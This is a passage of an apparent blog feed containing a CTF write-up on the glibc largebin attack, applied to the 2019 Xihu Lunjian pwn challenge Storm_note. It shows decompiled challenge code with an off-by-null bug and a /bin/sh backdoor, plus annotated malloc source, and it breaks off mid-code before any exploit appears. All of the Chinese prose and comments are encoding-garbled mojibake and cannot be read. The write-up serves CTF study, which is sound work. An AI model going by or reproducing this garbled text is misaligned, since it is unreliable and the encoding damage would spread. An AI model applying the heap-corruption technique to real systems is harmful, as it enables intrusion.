<p>ä»”ç»†è§‚å¯Ÿå›¾ç‰‡å‘ç° 2 å·çº¿é­å…¬æ‘ç‚¹ç‚¹é¢œè‰²æ¯”è¾ƒæ·±ï¼Œç”¨å­—ç¬¦ä¸² weigongcun ä½œä¸ºå¯†é’¥åœ¨çº¿è§£å¯†å¾—åˆ° flag</p>
<p>DDCTF{Q*2!x@B0}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Largebin attack</title>
    <url>/2019/04/18/largebin_attack/</url>
    <content><![CDATA[<p>æœ€è¿‘æ‰“äº†è¥¿æ¹–è®ºå‰‘é¢„é€‰èµ›ï¼Œæ¯”èµ›ä¸­ä¸€é“ pwn é¢˜çš„åˆ©ç”¨æ‰‹æ³•æ˜¯ largebin attackã€‚largebin attack åœ¨ CTF æ¯”èµ›ä¸­çš„å‡ºç°é¢‘ç‡æ¯”è¾ƒä½ï¼Œä½†æ˜¯ä¸€æ—¦å‡ºç°è‚¯å®šå°±æ˜¯éš¾åº¦è¾ƒé«˜çš„é¢˜ç›®ã€‚ä»Šå¤©å°±æ¥æ¢ç©¶ä¸€ä¸‹å…³äº largebin attack çš„ç›¸å…³æ”»å‡»æ‰‹æ®µã€‚</p>
<span id="more"></span>

<h2 id="è¥¿æ¹–è®ºå‰‘-2019-Storm-note"><a href="#è¥¿æ¹–è®ºå‰‘-2019-Storm-note" class="headerlink" title="è¥¿æ¹–è®ºå‰‘ 2019 Storm_note"></a>è¥¿æ¹–è®ºå‰‘ 2019 Storm_note</h2><p>è¿™é“é¢˜ä¸æ˜¯åŸåˆ›ï¼Œè€Œæ˜¯ç”± 0ctf çš„ heapstorm2 ä¿®æ”¹è€Œæ¥ï¼Œç¨ç¨é™ä½äº†éš¾åº¦ã€‚æ‰€æœ‰ä¿æŠ¤å…¨å¼€ã€‚</p>
<p>é¦–å…ˆåˆ†æé¢˜ç›®ä»£ç ï¼Œç¨‹åºå®ç°äº†ä¸€ä¸ªå¸¸è§çš„ note ç®¡ç†ç³»ç»Ÿï¼Œå¯ä»¥æ·»åŠ ï¼Œä¿®æ”¹å’Œåˆ é™¤ noteï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ª backdoor å‡½æ•°ã€‚</p>
<p>ä¸»å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_proc();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        backdoor();</span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      alloc_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      edit_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>backdoor:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;If you can open the lock, I will let you in&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL) )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>add:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">alloc_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size ?&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">1048575</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      note[i] = <span class="built_in">calloc</span>(v1, <span class="number">1uLL</span>);</span><br><span class="line">      note_size[i] = v1;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>edit:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index ?&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    v2 = read(<span class="number">0</span>, note[v1], note_size[v1]);</span><br><span class="line">    *(note[v1] + v2) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>delete:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index ?&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(note[v1]);</span><br><span class="line">    note[v1] = <span class="number">0LL</span>;</span><br><span class="line">    note_size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ¼æ´åœ¨ edit å‡½æ•°ä¸­ï¼Œç¼–è¾‘ä¸€ä¸ªå †å—åï¼Œä¼šåœ¨ç¼–è¾‘çš„å†…å®¹æœ€åè¡¥é›¶ï¼Œå¯¼è‡´äº† off-by-nullï¼Œoff-by-null çš„ç»å…¸åˆ©ç”¨æ‰‹æ®µæ˜¯æ„é€ å †å—åˆå¹¶ï¼Œä»è€Œä¿®æ”¹ chunk çš„ç»“æ„ã€‚</p>
<p>å¦å¤–æŸ¥çœ‹ç¨‹åºçš„ init å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">init_proc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )                         <span class="comment">// ä¸ä¼šä½¿ç”¨ fastbin</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap(<span class="number">0xABCD0000</span>LL, <span class="number">4096uLL</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != <span class="number">0xABCD0000</span>LL )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  result = read(fd, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">0x30</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªç‰¹åˆ«çš„å‡½æ•° malloptï¼Œåœ¨ç½‘ä¸Šæœç´¢ç›¸å…³ä¿¡æ¯å¾—çŸ¥ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥æ§åˆ¶ malloc å„ç§å‚æ•°çš„ï¼Œæ¯”å¦‚å¯ä»¥ä½¿ç”¨å®ƒè®¾ç½® fastbin çš„æœ€å¤§å€¼ MAX_FAST ç­‰ã€‚mallopt(1, 0) çš„å«ä¹‰æ˜¯ä¸ä½¿ç”¨ fastbin é“¾è¡¨ï¼Œä¹Ÿå°±æ˜¯è¯´å½“é‡Šæ”¾ä¸€ä¸ªæœ¬å±äº fastbin èŒƒå›´çš„ chunkï¼Œå®ƒä¸ä¼šè¿›å…¥åˆ° fastbinï¼Œè€Œæ˜¯ä¼šè¿›å…¥ unsorted binã€‚</p>
<p>å¦å¤–è°ƒç”¨äº† mmap å‡½æ•°åœ¨ 0xABCD0000 åœ°å€å¼€è¾Ÿäº†ç©ºé—´ï¼Œå¹¶ä¸”è¯»å…¥äº† 0x30 å¤§å°çš„éšæœºæ•°ï¼Œåœ¨ backdoor å‡½æ•°ä¸­ï¼Œå¦‚æœèƒ½å¤ŸçŒœå¯¹éšæœºæ•°ï¼Œå°±èƒ½ getshellã€‚</p>
<p>é‚£ä¹ˆä¸€ä¸ªæ˜¾ç„¶çš„æ€è·¯å°±æ˜¯é€šè¿‡åˆ©ç”¨æ¼æ´æ¥æ§åˆ¶ mmap çš„å†…å­˜ï¼Œä¿®æ”¹å…¶ä¸­çš„éšæœºæ•°ï¼Œç”±äºç¨‹åºåªå­˜åœ¨ off-by-null æ¼æ´ï¼Œå¹¶ä¸”ç¦ç”¨äº† fastbin é“¾è¡¨ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ largebin attack è·å¾—ä»»æ„åœ°å€å†™çš„èƒ½åŠ›ã€‚</p>
<p>ç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼Œå…ˆé€šè¿‡ off-by-null æ¥æ„é€ å †å—é‡å ï¼Œåœ¨é‡å çš„å †å—ä¸­æ§åˆ¶ largebin chunk çš„ bk å’Œ bk_nextsize è¿™ä¸¤ä¸ªå­—æ®µï¼Œå½“ largebin chunk ä» unsortedbin ä¸­å¸ä¸‹å¹¶é“¾æ¥åˆ° largebin çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå‘ç”ŸæŒ‡é’ˆçš„è¯»å†™ï¼Œä»è€Œåœ¨ mmap åœ°å€åˆ†é…ä¸€ä¸ªå †å—ï¼Œä¿®æ”¹éšæœºæ•°ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚</p>
<h2 id="What-is-largebin"><a href="#What-is-largebin" class="headerlink" title="What is largebin"></a>What is largebin</h2><p>çŸ¥å·±çŸ¥å½¼æ–¹èƒ½ç™¾æˆ˜ç™¾èƒœï¼Œlargebin çš„ç»“æ„å’Œå…¶ä»–é“¾è¡¨éƒ½ä¸ç›¸åŒï¼Œè€Œä¸”æ›´åŠ å¤æ‚ã€‚</p>
<p>é¦–å…ˆï¼Œlargebin chunk ä¸­æœ‰ fd å’Œ bk æŒ‡é’ˆï¼Œå¦å¤–è¿˜æœ‰ fd_nextsize å’Œ bk_nextsize è¿™ä¸¤ä¸ªæŒ‡é’ˆã€‚</p>
<p>largebin çš„ç»“æ„ï¼š</p>
<p>largebin ä¹Ÿåˆ†ä¸ºå¾ˆå¤šä¸ª indexï¼Œæ¯ä¸ª index çš„å †å—å¤„åœ¨ä¸€å®šçš„èŒƒå›´å†…ï¼Œç¬¬ä¸€æ¡é“¾è¡¨ç¼–å·ä¸º 64ï¼ŒèŒƒå›´æ˜¯ [0x400, 0x440)ï¼Œç¬¬äºŒæ¡æ˜¯ 65ï¼ŒèŒƒå›´æ˜¯ [0x440, 0x480)ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p>
<p>largebin å †å—å¯ä»¥ç†è§£ä¸ºé“¾è¡¨æ•°ç»„ï¼Œchunk çš„ size æŒ‰ç…§ä»å¤§åˆ°å°é¡ºåºæ’åˆ—ï¼Œlargebin ç»´æŠ¤äº†ä¸¤ä¸ªé“¾è¡¨ï¼Œä¸€ä¸ªæ˜¯çºµå‘çš„ç”± fdã€bk ç»„æˆçš„æ™®é€šé“¾è¡¨ï¼Œå¦ä¸€ä¸ªæ˜¯æ¨ªå‘çš„ç”± fd_nextsizeã€bk_nextsize ç»„æˆçš„ size é“¾è¡¨ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack1.png"
                     
                ></p>
<p>æ¯ä¸€æ¡çºµå‘é“¾è¡¨çš„ chunk size æ˜¯ç›¸åŒçš„ã€‚</p>
<p>å½“ä¸€ä¸ªå †å—è¢« free ä¹‹å(é™¤ fastbin ä¹‹å¤–)ï¼Œä¼šå…ˆè¿›å…¥åˆ° unsortedbin ä¸­ï¼Œå½“å†æ¬¡åˆ†é…å †å—çš„æ—¶å€™ï¼Œä¸ç¬¦åˆåˆ†é…å¤§å°çš„å †å—å°±ä¼šè¢«åˆ†åˆ«æ’å…¥åˆ°å¯¹åº”çš„é“¾è¡¨ä¸­å»ï¼Œå½“ä¸€ä¸ªå †å—è¢«æ’å…¥åˆ° largebin ä¸­æ—¶ï¼Œå¯¹åº”çš„ glibc æºä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">  victim_index = smallbin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">  victim_index = largebin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">      fwd = bck;</span><br><span class="line">      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">      bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€ç§æƒ…å†µï¼Œå–å‡ºçš„ chunk size æ¯”å½“å‰é“¾è¡¨ä¸­æœ€å°çš„ chunk è¿˜å°ï¼Œè¿™æ—¶å°±å¯ä»¥ç›´æ¥å°†å †å—æ’å…¥åˆ°æ¨ªå‘é“¾è¡¨çš„æœ€åï¼Œè®¾ç½®å¥½ bk_nextsizeã€fd_nextsize ä¸¤ä¸ªæŒ‡é’ˆï¼Œè¿™ä¸ªæ’å…¥è¿‡ç¨‹å’Œæ™®é€šé“¾è¡¨å¤„ç†ç±»ä¼¼ã€‚</p>
<p>å¦‚æœå †å—çš„ size æ¯”æœ€å°çš„å †å—å¤§ä¸€äº›ï¼Œå°±éœ€è¦ä»æ¨ªå‘é“¾è¡¨å¤´éƒ¨å¼€å§‹éå†ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ª size å¤§äºç­‰äºå¾…æ’å…¥ chunk çš„é“¾è¡¨ã€‚å½“æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªé“¾è¡¨ä¹‹åï¼Œåˆ¤æ–­é“¾è¡¨çš„ size æ˜¯å¦ç²¾ç¡®ç­‰äºå¾…æ’å…¥ chunk çš„ sizeï¼Œå¦‚æœæ˜¯ï¼Œç›´æ¥å°†è¿™ä¸ª chunk æ’å…¥åˆ°å½“å‰çºµå‘é“¾è¡¨çš„ç¬¬äºŒä¸ªä½ç½®ï¼Œå¦åˆ™(å¾…æ’å…¥ chunk çš„ size æ¯”å½“å‰çºµå‘é“¾è¡¨å¤´ç»“ç‚¹çš„ size å¤§)ä¼šå°†æ–°çš„ chunk ä½œä¸ºå½“å‰çºµå‘é“¾è¡¨çš„å¤´ç»“ç‚¹ï¼Œæ’å…¥åˆ°æ¨ªå‘é“¾è¡¨ä¸­ã€‚</p>
<p>å¦å¤–ï¼Œå¦‚æœ largebin æ˜¯ç©ºçš„ï¼Œåˆ™ç›´æ¥å°† chunk çš„ fd_nextsize bk_nextsize æ›´æ–°æˆè‡ªèº«ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯å †å—æ’å…¥ largebin çš„å¤§è‡´æµç¨‹ï¼Œé¦–å…ˆå¤„ç† Â fd_nextsize Â bk_nextsize Â æ„æˆçš„æ¨ªå‘é“¾è¡¨ï¼Œç„¶åå¤„ç†çºµå‘é“¾è¡¨ã€‚</p>
<p>æ€»ç»“å‡ºå¦‚ä¸‹è§„åˆ™(ç›¸åŒidxä¸‹)</p>
<ul>
<li>æŒ‰ç…§å¤§å°ä»å¤§åˆ°å°æ’åº</li>
<li>è‹¥å¤§å°ç›¸åŒ,æŒ‰ç…§freeæ—¶é—´æ’åº</li>
<li>è‹¥å¹²ä¸ªå¤§å°ç›¸åŒçš„å †å—,åªæœ‰é¦–å †å—çš„<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ä¼šæŒ‡å‘å…¶ä»–å †å—,åé¢çš„å †å—çš„<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>å‡ä¸º0</li>
<li>sizeæœ€å¤§çš„chunkçš„<code>bk_nextsize</code>æŒ‡å‘æœ€å°çš„chunk; sizeæœ€å°çš„chunkçš„<code>fd_nextsize</code>æŒ‡å‘æœ€å¤§çš„chunk</li>
</ul>
<p>æˆ‘ä»¬å¤§è‡´äº†è§£å‘ largebin æ’å…¥å †å—çš„æµç¨‹ï¼Œä½†æ˜¯ ä» largebin å¸ä¸‹å †å—çš„æ—¶å€™ä¹Ÿæ¶‰åŠä¸€äº›æœ‰è¶£çš„åœ°æ–¹ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;    <span class="comment">// åˆ¤æ–­ nb æ˜¯ä¸æ˜¯ smallbin</span></span><br><span class="line">      bin = bin_at(av, idx);    <span class="comment">// è·å–é“¾è¡¨ (idx æ˜¯ä¹‹å‰è®¡ç®—çš„ nb åœ¨ largebin é“¾è¡¨çš„ index)</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;  <span class="comment">// æ£€æŸ¥å¯¹åº”çš„é“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼Œæˆ–è€…å…¶ä¸­æœ€å¤§çš„å †å—æ¯” nb è¿˜å°ï¼Ÿ</span></span><br><span class="line"></span><br><span class="line">  victim = victim-&gt;bk_nextsize;</span><br><span class="line">  <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(nb)))    <span class="comment">// å¼€å§‹éå† largebinï¼Œå°è¯•æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å †å—</span></span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">     list does not have to be rerouted.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">    victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">  remainder_size = size - nb;  <span class="comment">// æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å †å—ï¼Œè®¡ç®—ä¸€ä¸‹åˆ‡å‰²åå‰©ä½™çš„å †å—å¤§å°</span></span><br><span class="line">  unlink(victim, bck, fwd);   <span class="comment">// å°†è¿™ä¸ªå †å—ä» largebin å¸ä¸‹</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Exhaust */</span></span><br><span class="line">  <span class="keyword">if</span> (remainder_size &lt; MINSIZE)  &#123;    <span class="comment">// å¦‚æœåˆ‡å‰²åå‰©ä¸‹çš„å †å—å¤§å° å°äºæœ€å°çš„å †å—(16 or 32) è¿™ä¸ªå †å—ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œä¾‹å¦‚ 64 ä½ç³»ç»Ÿï¼Œåˆ‡å‰²å‰©ä½™çš„å¤§å°ä¸º 16ï¼Œé‚£ä¹ˆç”¨æˆ·æ‹¿åˆ°çš„å †å—ä¸­æœ‰16 ä¸ªå­—èŠ‚æ˜¯å¤šå‡ºæ¥çš„(æˆ–è€…è¯´æ˜¯æµªè´¹æ‰çš„)</span></span><br><span class="line">    set_inuse_bit_at_offset(victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Split */</span></span><br><span class="line">  <span class="keyword">else</span> &#123;     <span class="comment">// å¦‚æœåˆ‡å‰²å‰©ä½™çš„å †å—å¤§å°å¤§äº MINSIZE</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span 